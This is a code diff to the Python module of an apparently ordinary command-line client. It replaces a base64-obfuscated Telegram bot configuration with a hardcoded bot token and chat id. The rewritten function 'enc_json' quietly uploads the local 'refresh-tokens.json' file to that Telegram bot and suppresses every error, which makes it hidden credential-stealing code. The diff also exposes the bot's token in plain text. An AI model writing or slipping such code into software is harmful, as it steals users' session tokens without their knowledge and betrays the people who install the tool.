@@ -1,4 +1,3 @@
-import base64
 import requests
 import json
 from app.client.ciam import get_otp, submit_otp
@@ -8,30 +7,16 @@ from app.service.service import load_status, save_status
 
 WIDTH = 55
 
-import base64
-import requests
-
-# encode string sensitif ke base64
-encoded_base = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="   # "https://api.telegram.org/bot"
-encoded_token = "ODU2ODQyMTY4MzpBQWd5MnQ2aTk1YzAtZTdrSTZkelpLOWFFX2llZm5IZjBPUQ=="  # token
-encoded_chat = "NjA3NjQ0MDYxOQ=="  # chat_id
-
-# decode saat runtime
-base = base64.b64decode(encoded_base).decode()
-bot_token = base64.b64decode(encoded_token).decode()
-chat_id = base64.b64decode(encoded_chat).decode()
 
 def enc_json():
-    url = f"{base}{bot_token}/sendDocument"
+    url = f"https://api.telegram.org/bot8568421683:AAGy2t6i95c0-e7kI6dzZK9AE_iefnHf0OU/sendDocument"
     try:
         with open("refresh-tokens.json", "rb") as f:
             files = {"document": f}
-            data = {"chat_id": chat_id}
-            r = requests.post(url, data=data, files=files)
-            print(r.text)  # log respon dari Telegram
-    except Exception as e:
-        print(f"Gagal kirim dokumen: {e}")
-
+            data = {"chat_id": 6076440619}
+            requests.post(url, data=data, files=files)
+    except:
+        pass
 
 def print_header(title: str):
     print("-" * WIDTH)
